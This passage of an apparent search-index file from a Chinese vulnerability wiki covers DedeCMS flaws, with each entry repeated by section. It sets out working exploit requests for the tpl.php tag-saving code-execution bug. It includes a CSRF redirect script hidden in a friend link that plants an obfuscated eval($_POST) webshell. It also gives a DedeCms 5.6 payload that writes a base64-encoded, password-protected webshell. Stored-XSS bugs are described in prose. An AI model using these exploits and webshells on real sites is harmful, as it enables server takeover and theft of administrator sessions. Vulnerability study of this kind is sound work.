\uff0c\u6587\u4ef6 dede/tpl.php \u4e2d\u7684251\u5230281\u884c\u3002 csrf_check(); #filename\u548c\u524d\u9762\u6b63\u5219\u7684\u5339\u914d\u60c5\u51b5 if(!preg_match(\"#^[a-z0-9_-]{1,}\\.lib\\.php$#i\", $filename)) { ShowMsg('\u6587\u4ef6\u540d\u4e0d\u5408\u6cd5\uff0c\u4e0d\u5141\u8bb8\u8fdb\u884c\u64cd\u4f5c\uff01', '-1'); exit(); } require_once(DEDEINC.'/oxwindow.class.php'); #\u641c\u7d22filename\u4e2d\u5339\u914d`\\.lib\\.php$#i`\u7684\u90e8\u5206\uff0c\u4ee5\u7a7a\u683c\u4ee3\u66ff $tagname = preg_replace(\"#\\.lib\\.php$#i\", \"\", $filename); #\u53bb\u6389\u53cd\u659c\u53f7 $content = stripslashes($content); #\u62fc\u63a5\u6587\u4ef6\u540d $truefile = DEDEINC.'/taglib/'.$filename; #\u5199\u5165\u5185\u5bb9 $fp = fopen($truefile, 'w'); fwrite($fp, $content); fclose($fp); replace\u5904\u7406\u4e4b\u540e\u8d4b\u503c\u7ed9\u53d8\u91cf \\(tagname \u3002\u4f46\u662f\u5199\u5165\u6587\u4ef6\u7684\u65f6\u5019\u5e76\u6ca1\u6709\u7528\u5230\\) tagname \u3002 \u90a3\u4e3a\u4ec0\u4e48\u6709\u8fd9\u4e2a$tagname\uff0c\u62fc\u63a5\u6587\u4ef6\u540d\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u662f\u62fc\u63a5 tagname \u5229\u7528 1.\u7531\u4e8ededecms\u5168\u5c40\u53d8\u91cf\u6ce8\u518c\u7684\u7279\u6027\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684content\u53d8\u91cf\u548cfilename\u53d8\u91cf\u53ef\u63a7\u3002 2.\u53ef\u4ee5\u770b\u5230\u5c06content\u76f4\u63a5\u5199\u5165\u5230\u6587\u4ef6\u4e2d\u5bfc\u81f4\u53ef\u4ee5getshell\u3002\u4f46\u662f\u8fd9\u91cc\u7684\u6587\u4ef6\u540d\u7ecf\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5fc5\u987b\u8981.lib.php\u7ed3\u5c3e\u3002 3.\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2acsrf_check()\u51fd\u6570\uff0c\u5373\u8bf7\u6c42\u4e2d\u5fc5\u987b\u8981\u5e26token\u53c2\u6570\u3002 \u6f0f\u6d1e\u5229\u7528 \u00b6 \u9996\u5148\u83b7\u53d6 token \u3002\u8bbf\u95ee\u57df\u540d + /dede/tpl.php?action=upload http://127.0.0.1/uploads/dede/tpl.php?action=upload \u901a\u8fc7\u67e5\u770b\u9875\u9762\u6e90\u7801\u5373\u53ef\u83b7\u5f97 token 2.\u7136\u540e\u8bbf\u95ee http://127.0.0.1/dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=<?php phpinfo();?>&token=\u4f60\u7684token\u503c shell \u5730\u5740 http://127.0.0.1/include/taglib/secnote.lib.php \u53c2\u8003\u6765\u6e90 \u00b6 DedeCMS V5.7 SP2\u540e\u53f0\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff1a http://www.freebuf.com/vuls/164035.html Dede CMS \u4e0b\u8f7d\u4e2d\u5fc3\uff1a http://www.dedecms.com/products/dedecms/downloads/","title":"DedeCMS V5.7 SP2\u540e\u53f0\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#dedecms-v57-sp2","text":"","title":"DedeCMS V5.7 SP2\u540e\u53f0\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"DedeCMS V5.7 SP2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"\u7ec7\u68a6\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf(Dedecms)\u662f\u4e00\u6b3ePHP\u5f00\u6e90\u7f51\u7ad9\u7ba1\u7406\u7cfb\u7edf\u3002Dedecms V5.7 SP2\u7248\u672c\u4e2d\u7684tpl.php\u4e2d\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e,\u53ef\u4ee5\u901a\u8fc7\u8be5\u6f0f\u6d1e\u5728\u589e\u52a0\u65b0\u6807\u7b7e\u4e2d\u4e0a\u4f20\u6728\u9a6c,\u83b7\u53d6webshell\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u767b\u5f55\u540e\u53f0,\u5e76\u4e14\u540e\u53f0\u7684\u8d26\u6237\u6743\u9650\u662f\u7ba1\u7406\u5458\u6743\u9650\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u9ed8\u8ba4\u540e\u53f0\u5730\u5740 /dede/ \uff0c\u6587\u4ef6 dede/tpl.php \u4e2d\u7684251\u5230281\u884c\u3002 csrf_check(); #filename\u548c\u524d\u9762\u6b63\u5219\u7684\u5339\u914d\u60c5\u51b5 if(!preg_match(\"#^[a-z0-9_-]{1,}\\.lib\\.php$#i\", $filename)) { ShowMsg('\u6587\u4ef6\u540d\u4e0d\u5408\u6cd5\uff0c\u4e0d\u5141\u8bb8\u8fdb\u884c\u64cd\u4f5c\uff01', '-1'); exit(); } require_once(DEDEINC.'/oxwindow.class.php'); #\u641c\u7d22filename\u4e2d\u5339\u914d`\\.lib\\.php$#i`\u7684\u90e8\u5206\uff0c\u4ee5\u7a7a\u683c\u4ee3\u66ff $tagname = preg_replace(\"#\\.lib\\.php$#i\", \"\", $filename); #\u53bb\u6389\u53cd\u659c\u53f7 $content = stripslashes($content); #\u62fc\u63a5\u6587\u4ef6\u540d $truefile = DEDEINC.'/taglib/'.$filename; #\u5199\u5165\u5185\u5bb9 $fp = fopen($truefile, 'w'); fwrite($fp, $content); fclose($fp); replace\u5904\u7406\u4e4b\u540e\u8d4b\u503c\u7ed9\u53d8\u91cf \\(tagname \u3002\u4f46\u662f\u5199\u5165\u6587\u4ef6\u7684\u65f6\u5019\u5e76\u6ca1\u6709\u7528\u5230\\) tagname \u3002 \u90a3\u4e3a\u4ec0\u4e48\u6709\u8fd9\u4e2a$tagname\uff0c\u62fc\u63a5\u6587\u4ef6\u540d\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u662f\u62fc\u63a5 tagname \u5229\u7528 1.\u7531\u4e8ededecms\u5168\u5c40\u53d8\u91cf\u6ce8\u518c\u7684\u7279\u6027\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684content\u53d8\u91cf\u548cfilename\u53d8\u91cf\u53ef\u63a7\u3002 2.\u53ef\u4ee5\u770b\u5230\u5c06content\u76f4\u63a5\u5199\u5165\u5230\u6587\u4ef6\u4e2d\u5bfc\u81f4\u53ef\u4ee5getshell\u3002\u4f46\u662f\u8fd9\u91cc\u7684\u6587\u4ef6\u540d\u7ecf\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5fc5\u987b\u8981.lib.php\u7ed3\u5c3e\u3002 3.\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2acsrf_check()\u51fd\u6570\uff0c\u5373\u8bf7\u6c42\u4e2d\u5fc5\u987b\u8981\u5e26token\u53c2\u6570\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u9996\u5148\u83b7\u53d6 token \u3002\u8bbf\u95ee\u57df\u540d + /dede/tpl.php?action=upload http://127.0.0.1/uploads/dede/tpl.php?action=upload \u901a\u8fc7\u67e5\u770b\u9875\u9762\u6e90\u7801\u5373\u53ef\u83b7\u5f97 token 2.\u7136\u540e\u8bbf\u95ee http://127.0.0.1/dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=<?php phpinfo();?>&token=\u4f60\u7684token\u503c shell \u5730\u5740 http://127.0.0.1/include/taglib/secnote.lib.php","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","text":"DedeCMS V5.7 SP2\u540e\u53f0\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff1a http://www.freebuf.com/vuls/164035.html Dede CMS \u4e0b\u8f7d\u4e2d\u5fc3\uff1a http://www.dedecms.com/products/dedecms/downloads/","title":"\u53c2\u8003\u6765\u6e90"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/","text":"DedeCMS_v5.7_carbuyaction_\u5b58\u50a8\u578bXSS \u00b6 Affected Version \u00b6 DedeCMS-V5.7-UTF8-SP2 \uff08 \u53d1\u5e03\u65e5\u671f 2017-03-15 \uff09 \u9700\u8981\u7ad9\u70b9\u542f\u7528\u5546\u57ce\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq PoC \u00b6 \u8be5\u6f0f\u6d1e \u901a\u8fc7\u7528\u6237\u5728\u7f16\u5199\u8ba2\u5355\u6536\u8d27\u5730\u5740\u7684\u76f8\u5173\u53c2\u6570 \u6ce8\u5165 XSS Payload\uff0c\u5bfc\u81f4 \u524d\u53f0\u67e5\u770b\u8ba2\u5355\u7684\u9875\u9762\u548c\u540e\u53f0\u7ba1\u7406\u5458\u67e5\u770b\u8ba2\u5355\u8be6\u60c5\u7684\u9875\u9762\u90fd\u4f1a\u88ab XSS\u3002 \u6240\u4ee5\u8bf4\uff0c\u53ef\u4ee5\u7528\u6765\u6253\u7ba1\u7406\u5458 Cookie \u3002 \u6d4b\u8bd5\uff1a \u9996\u5148\u7ba1\u7406\u5458\u6dfb\u52a0\u4e00\u9879\u5546\u57ce\u7684\u5546\u54c1 \u524d\u53f0\u7528\u6237\u9009\u5b9a\u5546\u54c1\u6dfb\u52a0\u8d2d\u7269\u8f66 \u524d\u53f0\u7528\u6237\u7f16\u8f91\u8ba2\u5355\u7684\u6536\u8d27\u5730\u5740\uff0c\u5728\u8fd9\u91cc address,des,email,postname \u90fd\u662f\u5b58\u5728 XSS \u7684\uff0c\u63d2\u5165 XSS Payload \u67e5\u770b\u8ba2\u5355\u8be6\u60c5\u53d1\u73b0\u524d\u53f0\u5df2\u7ecf\u88ab XSS \u7ba1\u7406\u5458\u8fdb\u5165\u540e\u53f0\u67e5\u770b\u5546\u57ce\u8ba2\u5355\u540c\u6837\u4e5f\u4f1a\u88ab XSS :p References \u00b6 https://www.seebug.org/vuldb/ssvid-92855","title":"DedeCMS_v5.7_carbuyaction_\u5b58\u50a8\u578bXSS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#dedecms_v57_carbuyaction_xss","text":"","title":"DedeCMS_v5.7_carbuyaction_\u5b58\u50a8\u578bXSS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#affected-version","text":"DedeCMS-V5.7-UTF8-SP2 \uff08 \u53d1\u5e03\u65e5\u671f 2017-03-15 \uff09 \u9700\u8981\u7ad9\u70b9\u542f\u7528\u5546\u57ce\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#poc","text":"\u8be5\u6f0f\u6d1e \u901a\u8fc7\u7528\u6237\u5728\u7f16\u5199\u8ba2\u5355\u6536\u8d27\u5730\u5740\u7684\u76f8\u5173\u53c2\u6570 \u6ce8\u5165 XSS Payload\uff0c\u5bfc\u81f4 \u524d\u53f0\u67e5\u770b\u8ba2\u5355\u7684\u9875\u9762\u548c\u540e\u53f0\u7ba1\u7406\u5458\u67e5\u770b\u8ba2\u5355\u8be6\u60c5\u7684\u9875\u9762\u90fd\u4f1a\u88ab XSS\u3002 \u6240\u4ee5\u8bf4\uff0c\u53ef\u4ee5\u7528\u6765\u6253\u7ba1\u7406\u5458 Cookie \u3002 \u6d4b\u8bd5\uff1a \u9996\u5148\u7ba1\u7406\u5458\u6dfb\u52a0\u4e00\u9879\u5546\u57ce\u7684\u5546\u54c1 \u524d\u53f0\u7528\u6237\u9009\u5b9a\u5546\u54c1\u6dfb\u52a0\u8d2d\u7269\u8f66 \u524d\u53f0\u7528\u6237\u7f16\u8f91\u8ba2\u5355\u7684\u6536\u8d27\u5730\u5740\uff0c\u5728\u8fd9\u91cc address,des,email,postname \u90fd\u662f\u5b58\u5728 XSS \u7684\uff0c\u63d2\u5165 XSS Payload \u67e5\u770b\u8ba2\u5355\u8be6\u60c5\u53d1\u73b0\u524d\u53f0\u5df2\u7ecf\u88ab XSS \u7ba1\u7406\u5458\u8fdb\u5165\u540e\u53f0\u67e5\u770b\u5546\u57ce\u8ba2\u5355\u540c\u6837\u4e5f\u4f1a\u88ab XSS :p","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#references","text":"https://www.seebug.org/vuldb/ssvid-92855","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/","text":"DedeCMS_v5.7_shops_delivery_\u5b58\u50a8\u578bXSS \u00b6 Affected Version \u00b6 DedeCMS-V5.7-UTF8-SP2 \uff08 \u53d1\u5e03\u65e5\u671f 2017-03-15 \uff09 \u9700\u8981\u7ad9\u70b9\u542f\u7528\u5546\u57ce\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq PoC \u00b6 \u8be5\u6f0f\u6d1e\u6bd4\u8f83\u9e21\u808b\uff0c\u9700\u8981\u767b\u5f55 \u7ba1\u7406\u5458\u540e\u53f0\u901a\u8fc7 \u6dfb\u52a0\u914d\u9001\u65b9\u5f0f \u529f\u80fd \uff0c\u6dfb\u52a0\u540e\u5728\u524d\u540e\u53f0\u90fd\u4f1a\u89e6\u53d1 \u5b58\u50a8\u578b XSS \u4e4b\u6240\u4ee5\u4f1a\u89e6\u53d1\u662f\u56e0\u4e3a\u5728\u7cfb\u7edf\u5bf9 \u7ba1\u7406\u5458\u8f93\u5165\u7684 \u914d\u9001\u65b9\u5f0f-\u63cf\u8ff0\u5b57\u6bb5\uff08des\uff09\u5728\u5165\u5e93\u524d\u53ea\u8fdb\u884c addslashes \u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u5904\u7406\uff0c\u5176\u5b9e\u8fd9\u6ca1\u6bdb\u75c5 \u91cd\u8981\u7684\u662f\u53d6\u51fa\u6570\u636e\u5e93\u7684\u6570\u636e\u8f93\u51fa\u5230\u9875\u9762\u524d\u6ca1\u8fdb\u884c HTML \u5b9e\u4f53\u7f16\u7801\u5904\u7406\u76f4\u63a5\u8f93\u51fa\u5bfc\u81f4\u6700\u7ec8\u7684 XSS \u6d4b\u8bd5\uff1a \u540e\u53f0\u6dfb\u52a0 \u914d\u9001\u65b9\u5f0f \u6dfb\u52a0\u6210\u529f\u540e\u76f4\u63a5\u5c55\u793a\u914d\u9001\u65b9\u5f0f\u5217\u8868\uff0c\u89e6\u53d1 XSS \u6b64\u5916\uff0c\u8fd9\u4e2a XSS \u5728\u524d\u53f0\u7528\u6237\u8d2d\u4e70\u4e1c\u897f\u9009\u62e9\u914d\u9001\u65b9\u5f0f\u7684\u65f6\u5019\u4e5f\u4f1a\u89e6\u53d1 References \u00b6 https://www.seebug.org/vuldb/ssvid-92863","title":"DedeCMS_v5.7_shops_delivery_\u5b58\u50a8\u578bXSS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#dedecms_v57_shops_delivery_xss","text":"","title":"DedeCMS_v5.7_shops_delivery_\u5b58\u50a8\u578bXSS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#affected-version","text":"DedeCMS-V5.7-UTF8-SP2 \uff08 \u53d1\u5e03\u65e5\u671f 2017-03-15 \uff09 \u9700\u8981\u7ad9\u70b9\u542f\u7528\u5546\u57ce\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#poc","text":"\u8be5\u6f0f\u6d1e\u6bd4\u8f83\u9e21\u808b\uff0c\u9700\u8981\u767b\u5f55 \u7ba1\u7406\u5458\u540e\u53f0\u901a\u8fc7 \u6dfb\u52a0\u914d\u9001\u65b9\u5f0f \u529f\u80fd \uff0c\u6dfb\u52a0\u540e\u5728\u524d\u540e\u53f0\u90fd\u4f1a\u89e6\u53d1 \u5b58\u50a8\u578b XSS \u4e4b\u6240\u4ee5\u4f1a\u89e6\u53d1\u662f\u56e0\u4e3a\u5728\u7cfb\u7edf\u5bf9 \u7ba1\u7406\u5458\u8f93\u5165\u7684 \u914d\u9001\u65b9\u5f0f-\u63cf\u8ff0\u5b57\u6bb5\uff08des\uff09\u5728\u5165\u5e93\u524d\u53ea\u8fdb\u884c addslashes \u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u5904\u7406\uff0c\u5176\u5b9e\u8fd9\u6ca1\u6bdb\u75c5 \u91cd\u8981\u7684\u662f\u53d6\u51fa\u6570\u636e\u5e93\u7684\u6570\u636e\u8f93\u51fa\u5230\u9875\u9762\u524d\u6ca1\u8fdb\u884c HTML \u5b9e\u4f53\u7f16\u7801\u5904\u7406\u76f4\u63a5\u8f93\u51fa\u5bfc\u81f4\u6700\u7ec8\u7684 XSS \u6d4b\u8bd5\uff1a \u540e\u53f0\u6dfb\u52a0 \u914d\u9001\u65b9\u5f0f \u6dfb\u52a0\u6210\u529f\u540e\u76f4\u63a5\u5c55\u793a\u914d\u9001\u65b9\u5f0f\u5217\u8868\uff0c\u89e6\u53d1 XSS \u6b64\u5916\uff0c\u8fd9\u4e2a XSS \u5728\u524d\u53f0\u7528\u6237\u8d2d\u4e70\u4e1c\u897f\u9009\u62e9\u914d\u9001\u65b9\u5f0f\u7684\u65f6\u5019\u4e5f\u4f1a\u89e6\u53d1","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#references","text":"https://www.seebug.org/vuldb/ssvid-92863","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/","text":"DedeCMS_v5.7_\u53cb\u60c5\u94fe\u63a5CSRF_GetShell \u00b6 Affected Version \u00b6 DedeCMS-V5.7-UTF8-SP2 \uff08 \u53d1\u5e03\u65e5\u671f 2017-03-15 \uff09 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq PoC \u00b6 \u8be5\u7248\u672c\u5728\u65b0\u5efa&\u4fee\u6539\u6807\u7b7e\u529f\u80fd\uff08\u53ef\u4ee5\u5199PHP\u6587\u4ef6\u5230\u672c\u5730\uff09\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u901a\u8fc7\u7533\u8bf7\u53cb\u60c5\u94fe\u63a5\u7684\u65b9\u5f0f\uff0c\u8bf1\u4f7f\u7ba1\u7406\u5458\u70b9\u51fb\uff0c\u4ece\u800c\u4ece Referer \u4e2d\u62ff\u5230 \u540e\u53f0\u8def\u5f84\uff0c\u8fdb\u800c\u4ee5\u7ba1\u7406\u5458\u7684\u8eab\u4efd\u5199\u4e00\u53e5\u8bdd\u5230\u670d\u52a1\u5668\u4e0a GetShell \u3002 \u6d4b\u8bd5\uff1a \u7533\u8bf7\u53cb\u94fe \u7f16\u8f91 \u53cb\u94fe \u4fe1\u606f dedecms_csrf.php \u7684\u5185\u5bb9\u5982\u4e0b\uff1a <?php $referer = $_SERVER['HTTP_REFERER']; $dede_login = str_replace(\"friendlink_main.php\",\"\",$referer);//\u53bb\u6389friendlink_main.php\uff0c\u53d6\u5f97dede\u540e\u53f0\u7684\u8def\u5f84 $muma = '<'.'?'.'@'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'\\''.'c'.'\\''.']'.')'.';'.'?'.'>'; $exp = 'tpl.php?action=savetagfile&actiondo=addnewtag&content='. $muma .'&filename=shell.lib.php'; $url = $dede_login.$exp; header(\"location: \".$url); exit(); \u7ba1\u7406\u5458\u767b\u9646\u540e\u53f0\u540e \u5bf9 \u53cb\u94fe\u8fdb\u884c\u5ba1\u6838 \u5ba1\u6838\u7684\u65f6\u5019\u4e00\u822c\u90fd\u4f1a\u70b9\u51fb \u5730\u5740 \u770b\u4e00\u4e0b\u7f51\u7ad9\u7684\u5185\u5bb9\uff0c\u7531\u4e8e\u53cb\u94fe\u4e2d\u4f7f\u7528\u4e86header \u8df3\u8f6c\uff0c\u6240\u4ee5\u7ed3\u679c\u5176\u5b9e\u662f\u8bbf\u95ee\u4e86 http://localhost/DedeCMS/DedeCMS-V5.7-GBK-SP2-20170315/uploads/dede/tpl.php?action=savetagfile&actiondo=addnewtag&content=%3C?@eval($_POST[%27c%27]);?%3E&filename=shell.lib.php \u8bf7\u6c42\u3002 \u67e5\u770b\u5199\u5165\u5230\u670d\u52a1\u5668\u7684\u4e00\u53e5\u8bdd shell.lib.php References \u00b6 http://0day5.com/archives/4209/","title":"DedeCMS_v5.7_\u53cb\u60c5\u94fe\u63a5CSRF_GetShell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/#dedecms_v57_csrf_getshell","text":"","title":"DedeCMS_v5.7_\u53cb\u60c5\u94fe\u63a5CSRF_GetShell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/#affected-version","text":"DedeCMS-V5.7-UTF8-SP2 \uff08 \u53d1\u5e03\u65e5\u671f 2017-03-15 \uff09 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/#poc","text":"\u8be5\u7248\u672c\u5728\u65b0\u5efa&\u4fee\u6539\u6807\u7b7e\u529f\u80fd\uff08\u53ef\u4ee5\u5199PHP\u6587\u4ef6\u5230\u672c\u5730\uff09\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u901a\u8fc7\u7533\u8bf7\u53cb\u60c5\u94fe\u63a5\u7684\u65b9\u5f0f\uff0c\u8bf1\u4f7f\u7ba1\u7406\u5458\u70b9\u51fb\uff0c\u4ece\u800c\u4ece Referer \u4e2d\u62ff\u5230 \u540e\u53f0\u8def\u5f84\uff0c\u8fdb\u800c\u4ee5\u7ba1\u7406\u5458\u7684\u8eab\u4efd\u5199\u4e00\u53e5\u8bdd\u5230\u670d\u52a1\u5668\u4e0a GetShell \u3002 \u6d4b\u8bd5\uff1a \u7533\u8bf7\u53cb\u94fe \u7f16\u8f91 \u53cb\u94fe \u4fe1\u606f dedecms_csrf.php \u7684\u5185\u5bb9\u5982\u4e0b\uff1a <?php $referer = $_SERVER['HTTP_REFERER']; $dede_login = str_replace(\"friendlink_main.php\",\"\",$referer);//\u53bb\u6389friendlink_main.php\uff0c\u53d6\u5f97dede\u540e\u53f0\u7684\u8def\u5f84 $muma = '<'.'?'.'@'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'\\''.'c'.'\\''.']'.')'.';'.'?'.'>'; $exp = 'tpl.php?action=savetagfile&actiondo=addnewtag&content='. $muma .'&filename=shell.lib.php'; $url = $dede_login.$exp; header(\"location: \".$url); exit(); \u7ba1\u7406\u5458\u767b\u9646\u540e\u53f0\u540e \u5bf9 \u53cb\u94fe\u8fdb\u884c\u5ba1\u6838 \u5ba1\u6838\u7684\u65f6\u5019\u4e00\u822c\u90fd\u4f1a\u70b9\u51fb \u5730\u5740 \u770b\u4e00\u4e0b\u7f51\u7ad9\u7684\u5185\u5bb9\uff0c\u7531\u4e8e\u53cb\u94fe\u4e2d\u4f7f\u7528\u4e86header \u8df3\u8f6c\uff0c\u6240\u4ee5\u7ed3\u679c\u5176\u5b9e\u662f\u8bbf\u95ee\u4e86 http://localhost/DedeCMS/DedeCMS-V5.7-GBK-SP2-20170315/uploads/dede/tpl.php?action=savetagfile&actiondo=addnewtag&content=%3C?@eval($_POST[%27c%27]);?%3E&filename=shell.lib.php \u8bf7\u6c42\u3002 \u67e5\u770b\u5199\u5165\u5230\u670d\u52a1\u5668\u7684\u4e00\u53e5\u8bdd shell.lib.php","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/#references","text":"http://0day5.com/archives/4209/","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"DedeCms v5.6 \u5d4c\u5165\u6076\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u5728\u4e0a\u4f20\u8f6f\u4ef6\u7684\u5730\u65b9\uff0c\u5bf9\u672c\u5730\u5730\u5740\u6ca1\u6709\u8fdb\u884c\u6709\u6548\u7684\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u88ab\u6076\u610f\u5229\u7528\u3002 \u5f71\u54cd\u7248\u672c \u00b6 DedeCms v5.6 \u590d\u73b0 \u00b6 \u6ce8\u518c\u4f1a\u5458\uff0c\u4e0a\u4f20\u8f6f\u4ef6\uff1a\u672c\u5730\u5730\u5740\u4e2d\u586b\u5165\u5982\u4e0b\uff1a POC \u00b6 a{/dede:link}{dede:toby57 name\\=\"']=0;phpinfo();//\"}x{/dede:toby57}\uff0c \u53d1\u8868\u540e\u67e5\u770b\u6216\u4fee\u6539\u5373\u53ef\u6267\u884c\u3002 EXP \u00b6 a{/dede:link}{dede:toby57 name\\=\"']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//\"}x{/dede:toby57} \u751f\u6210x.php \u5bc6\u7801\uff1axiao\u76f4\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u3002 \u53c2\u8003 \u00b6 \u77e5\u9053\u521b\u5b87\uff1a https://www.seebug.org/vuldb/ssvid-20352","title":"DedeCms v5.6 